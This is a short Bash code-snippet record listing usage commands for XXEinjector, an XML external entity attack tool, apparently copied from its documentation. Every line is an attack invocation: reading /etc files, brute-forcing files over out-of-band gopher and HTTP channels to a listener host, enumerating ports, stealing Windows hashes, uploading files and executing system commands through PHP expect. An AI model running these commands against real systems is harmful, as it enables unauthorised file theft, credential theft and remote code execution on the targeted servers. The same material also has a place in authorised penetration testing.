---
id: ba69afb5-4af6-43b7-a817-9735cfd40a44
type: code
language: Bash
verified: false
created_at: '2023-04-06T03:56:43.973220+00:00'
updated_at: '2023-04-10T20:24:45.360586+00:00'
---

# Code Snippet ba69afb5

**Language**: Bash

```bash
# Enumerating /etc directory in HTTPS application:
ruby XXEinjector.rb --host=192.168.0.2 --path=/etc --file=/tmp/req.txt --ssl
# Enumerating /etc directory using gopher for OOB method:
ruby XXEinjector.rb --host=192.168.0.2 --path=/etc --file=/tmp/req.txt --oob=gopher
# Second order exploitation:
ruby XXEinjector.rb --host=192.168.0.2 --path=/etc --file=/tmp/vulnreq.txt --2ndfile=/tmp/2ndreq.txt
# Bruteforcing files using HTTP out of band method and netdoc protocol:
ruby XXEinjector.rb --host=192.168.0.2 --brute=/tmp/filenames.txt --file=/tmp/req.txt --oob=http --netdoc
# Enumerating using direct exploitation:
ruby XXEinjector.rb --file=/tmp/req.txt --path=/etc --direct=UNIQUEMARK
# Enumerating unfiltered ports:
ruby XXEinjector.rb --host=192.168.0.2 --file=/tmp/req.txt --enumports=all
# Stealing Windows hashes:
ruby XXEinjector.rb --host=192.168.0.2 --file=/tmp/req.txt --hashes
# Uploading files using Java jar:
ruby XXEinjector.rb --host=192.168.0.2 --file=/tmp/req.txt --upload=/tmp/uploadfile.pdf
# Executing system commands using PHP expect:
ruby XXEinjector.rb --host=192.168.0.2 --file=/tmp/req.txt --oob=http --phpfilter --expect=ls
# Testing for XSLT injection:
ruby XXEinjector.rb --host=192.168.0.2 --file=/tmp/req.txt --xslt
# Log requests only:
ruby XXEinjector.rb --logger --oob=http --output=/tmp/out.txt
```


